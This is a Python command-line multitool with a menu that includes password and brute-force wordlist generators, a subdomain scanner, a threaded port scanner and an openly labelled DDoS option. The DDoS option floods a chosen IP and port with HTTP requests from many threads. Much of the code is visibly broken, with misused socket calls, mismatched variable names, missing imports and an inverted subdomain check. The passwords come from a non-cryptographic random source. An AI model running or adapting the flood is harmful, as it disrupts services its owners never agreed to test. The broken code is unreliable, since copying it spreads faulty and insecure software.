
import os
import random
import socket
import sys
import threading
import time
import itertools
from queue import Queue
import phonenumbers

import pyqrcode
import requests

from pip._vendor.distlib.compat import raw_input
from phonenumbers import carrier
from phonenumbers import geocoder

from tabulate import tabulate
from tqdm import *



options = ("1- MY IP ADDRSS \n 2- PASSWORD GENERATOR \n 3- WORDLIST GENERATOR \n 4- BARCODE GENERATOR \n 5- QRCODE "
           "GENERATOR \n 6- PHONE NUMBER INFO \n 7- SUBDOMAIN SCANNER \n 8- PORT SCANNER \n 9- DDOS SCANNER \n")

print(options)
select = int(input("ENTER YOUR CHOICE "r""">>>-------------->"""))

match select:
    case 1:
        def loading():
            for _ in tqdm(range(100), desc="LOADING...", ascii=False, ncols=75):
                time.sleep(0.01)
                print("LOADING DONE!")
                

            
        def window_size(columns=750,height=70):
            os.system("clear")
            os.system(f'mode con: cols={columns} lines={height}')

        if __name__=="__main__":
                window_size(80,20)
                print("FIND MY IP")
                loading()

                
                hostname = socket.gethostname()
                ip_addr= socket.gethostbyname(hostname)
                print("YOUR DEVICE IS: "+ip_addr)
                print("YOUR IP ADDRESS IS: "+ ip_addr)
                raw_input("PRESS ENTER TO EXIT")
                #break
                
    case 2:
        
        def loading():
            for _ in tqdm(range(100), desc="LOADING...", ascii=False, ncols=75):
                time.sleep(0.01)
                print("LETS MOVE")
                

            
        def window_size(columns=750,height=70):
            os.system("cls")
            os.system(f'mode con: cols={columns} lines={height}')


        if __name__=="__main__":
                window_size(80,20)
                print("PASSWORD GENERATOR")
                loading()
                length=int(input("ENTER THE LENGTH OF PASSWORD "r""">>>-------------->"""))
                
        def get_random_string(length):
                lower = "abcdefghijklmnopqrstuvwxyz"
                upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
                numbers = "1234567890"
                symbols = "@#&*(){}[]/?"
                all = lower + upper + numbers + symbols
                password = "".join(random.sample(all,length))
                print("GENERATED PASSWORD OF LENGTH",length,"is ",password,""r""">>>>-------------->""")
                    
        get_random_string(length)
        raw_input("PRESS ENTER TO EXIT")
                    #break
                   
    case 3:
        
        def loading():
            for _ in tqdm(range(100),desc="LOADING...",ascii=False, ncols=75):
                time.sleep(0.01)
                print("LETS MOVE")
              

        def window_size(colums=750, hight=30):
            os.system("cls")
            os.system(f'mode con: cols={colums} lines={hight}')
            
        if __name__== "__main__":
            window_size(80,20)
            print("WORDLIST GENERATOR")
            loading()
            
            print("GENERATED PASSWORD IS SAVED IN THE PRESENT FOLDER/DIRECTORY")
            chrs = raw_input("ENTER THE LETTERS FOR COMBINATION"r""">>>>------------""""")
            l = int(raw_input("MINIMUM LENGTH OF PASSWORD"r""">>>>--------------"""""))
            k=l
            j=int(raw_input("MAXIMUM LENGTH OF THE PASSWORD"r""">>>>--------------"""""))
            n = j+1
            mtl = len(chrs)
            p=[]
            zt = raw_input("[+] ENTER THE NAME OF THE FILE"r""">>>>------------""""")
            for ltp in range(k,n):
                ans = mtl ** ltp
                p.append(ans)
                tline = sum(p)
                raw_input('ARE YOU READY?[PRESS ENTER]')
                start = time.time()
                
                psd = open(zt, 'a')
                
            for i in range(k,n):
                r = i*100 / n
                l = "{0} percent ".format(str(r))
                sys.stdout.write("\r%s" %1)
                sys.stdout.flush()
                psd.flush()
                
                for xs in itertools.product(chrs, repeat = i):
                  psd.write(''.join(xs) + '\n')
                  psd.flush()

        psd.close()
        sys.stdout.write("\DONE SUCCESS ")
        end = time.time()
        '\t [+] Process Completed               :    ', time.asctime()
        totaltime = end - start
        rate = tline / totaltime
          
        raw_input("PRESS ENTER TO EXIT")
          #break
          
    case 4:
        def loading():
            for _ in tqdm(range(100),desc="LOADING...",ascii=False, ncols=75):
                time.sleep(0.01)
                print("LETS MOVE")
              

             
        def window_size(colums=750, hight=30):
            os.system("cls")
            os.system(f'mode con: cols={colums} lines={hight}')
            
        if __name__== "__main__":
            window_size(80,20)
            print("BARCODE GENERATOR")
            loading()
            
        print("GENERATED BARCODE WILL BE SAVED AS PNG FILE IN THE DIRECTORY")
        
        def generator(number):
            my_code = EAN13(number,writer=ImageWriter())
            my_code.save("bar_code")
            
        if __name__ =="__main__":
            generator(input("ENTER 12 DIGIT NUMBER TO GENERATE BARCODE"r""">>>>------------"""""))
            raw_input("PRESS ENTER TO EXIT")
            #BREAK
            
    case 5:
        def loading():
            for _ in tqdm(range(100),desc="LOADING...",ascii=False, ncols=75):
                time.sleep(0.01)
                print("LETS MOVE")
              

             
        def window_size(colums=750, hight=30):
            os.system("cls")
            os.system(f'mode con: cols={colums} lines={hight}')
            
        if __name__== "__main__":
            window_size(80,20)
            print("QRCODE GENERATOR")
            loading()
            
        print("GENERATED QR CODE WILL BE SAVED AS myqr.png IN THE DIRECTORY")
        s = input("ENTER THE LINK TO CREAT A QRCODE "r""">>>>-------------""")
        url = pyqrcode.create(s)
        url.svg("myqr.svg", scale=8)
        url.png('myqr.png', scale=6)
        raw_input("PRESS ENTER TO EXIT")
        #break
        
    case 6:
        def loading():
            for _ in tqdm(range(100) , desc="LOADING...",ascii=False, ncols=60):
                time.sleep(0.01)
                print("LETS MOVE")
              

        def window_size(colums=750, hight=30):
            os.system("cls")
            os.system(f'mode con: cols={colums} lines={hight}')
            
        if __name__== "__main__":
            window_size(80,20)
            print("PHONE NUMBER SCANNER")
            loading()
            
        def num_scanner(phn_num):
            number = phonenumbers.parse(phn_num)
            description = geocoder.description_for_number(number, 'en')
            supplier = carrier.name_for_number(number, 'en')
            info = [["country", "SUPPLIER"], [description, supplier]]

            data = str(tabulate(info, headers="firstrow", tablefmt="github"))
            return data

        if __name__ == "__main__":
                number = input("ENTER THE NUMBER" r""">>>>-----------""")
                print(num_scanner(number))
                raw_input("press enter to exit")
                #break


    case 7:
        def loading():
            for _ in tqdm(range(100),desc="LOADING...",ascii=False, ncols=75):
                time.sleep(0.01)
                print("LETS MOVE")
              

             
        def window_size(colums=750, hight=30):
            os.system("cls")
            os.system(f'mode con: cols={colums} lines={hight}')
            
        if __name__== "__main__":
            window_size(80,20)
            print("SUBDOMAIN SCANNER")
            loading()
            
            print(" IT TAKES TIME ACCORDING TO THE DOMAIN")
            print(" USING DEFAULT ADDED WORDLIST WITH 649649 WORDS")
            domain = input("ENTER THE DOMAIN TO SCAN "r""">>>>--------------""")
            file = open("subdomains.txt")
            content = file.read()
            subdomains= content.splitlines()
            
            for subdomain in subdomains:
                url = f"http://{subdomain}.{domain}"
                try: 
                    requests.get(url)
                except requests.ConnectionError:
                    print("[+]Discovered subdomain:", url)


            raw_input("PRESS ENTER TO EXIT")
                    #break
                    
                    
    case 8:
         def loading():
            for _ in tqdm(range(100),desc="LOADING...",ascii=False, ncols=75):
                time.sleep(0.01)
                print("LETS MOVE")
              

         def window_size(colums=750, hight=30):
            os.system("cls")
            os.system(f'mode con: cols={colums} lines={hight}')
            

            
         def portscan(port):
                try: 
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.connect((target,port))
                    return True
                except:
                    return False
                    
         def get_ports(mode):
                        if mode==1:
                            for port in range(1,1024):
                                queue.put(port)
                        elif mode==2:
                            for port in range(1,49152):
                                queue.put(port)
                        elif mode==3:
                            ports = [20,21,23,25,53,80,110,443]
                            for port in ports:
                                queue.put(port)
                        elif mode==4:
                             ports = input("Enter your ports (seperate by blank):")
                             ports = ports.split()
                             ports = list(map(int, ports))
                             for port in ports:
                                 queue.put(port)
                                 
         def worker():
                             while not queue.empty():
                                 port = queue.get()
                                 if portscan(port):
                                     print("Port {} is open".format(port))
                                     open_ports.append(port)
                                     
         def run_scanner(threads, mode):
                             get_ports(mode)
                             thread_list = []
                             
                             for t in range(threads):
                                 thread = threading.Thread(target=worker)
                                 thread_list.append(thread)
                                 
                             for thread in thread_list:
                                 thread.start()
                             print("oprn ports are:" , open_ports)
         if __name__ == "__main__":
                                 window_size(80, 20)
                                 print("PORT SCANNER")
                                 loading()

                                 print("KEEP SOME PATIENCE, IT TAKES TIME ACCORDING TO THE OPEN PORTS AND PROVIDED IP")
                                 target = raw_input("ENTER THE IP ADDRESS TO SCAN"r""">>>>-------------""")
                                 queue = Queue()
                                 open_ports = []
                                 run_scanner(100,1)
         raw_input("PRESS ENTER TO EXIT")
                                 #break
                                 
    case 9:
         def loading():
            for _ in tqdm(range(100),desc="LOADING...",ascii=False, ncols=75):
                time.sleep(0.01)
                print("LETS MOVE")
              


             
         def window_size(colums=750, hight=30):
            os.system("cls")
            os.system(f'mode con: cols={colums} lines={hight}')
            
         if __name__== "__main__":
            window_size(80,20)
            print("DDOS")
            loading()
            
            target = raw_input("ENTER THE IP ADDRESS" r""">>>>-------------""")
            port = int(input("ENTER THE PORT  " r""">>>>-------------"""""))
            fake_ip = "181.4.20.196"
            
            already_Connected = 0
            
         def attack():
                while True:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect(target,port)
                    s.sendto("GET /" + target + "HTTP/ 1.1\r\n").encode('ascii'),(target,port)
                    s.sendto("GET /" + fake_ip + "HTTP/ 1.1\r\n").encode('ascii'),(target,port)
                    s.close()
                     
                    global already_connected
                     
                    already_connected+=1
                    if (already_connected % 500 == 0):
                         print(already_connected)
                         
                    for i in range(500):
                     thread = threading.Thread(target=attack)
                     thread.start()
                     raw_input("PRESS ENTER TO EXIT")
                     #break









